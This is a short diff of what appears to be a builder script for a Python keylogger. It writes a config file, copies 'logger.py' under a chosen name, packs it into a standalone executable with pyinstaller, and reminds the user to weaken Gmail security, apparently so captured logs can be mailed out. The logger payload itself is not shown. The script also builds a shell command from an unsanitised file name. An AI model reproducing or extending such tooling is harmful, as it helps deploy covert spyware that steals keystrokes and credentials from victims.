@@ -16,11 +16,11 @@ with open("config.py",'w') as out:
     out.write("\nFILE_NAME = \"" + file_name + "\"")
     out.write("\nSLEEP_INTERVAL = " + sleep_interval)
 
-print("[+] Writeing python logger to " + file_name)
-copyfile("logger.py", file_name)
+print("[+] Writeing python logger to source/" + file_name)
+copyfile("logger.py", "source/" + file_name)
 
 print("[+] Generating executable.")
-call("pyinstaller --onefile " + file_name, shell=True)
+call("pyinstaller --onefile source/" + file_name, shell=True)
 print("\n[+] Executable is stored in dist/" + file_name)
 
 print("\n\n[***] Don't forget to allow less secure applications in your Gmail account.")
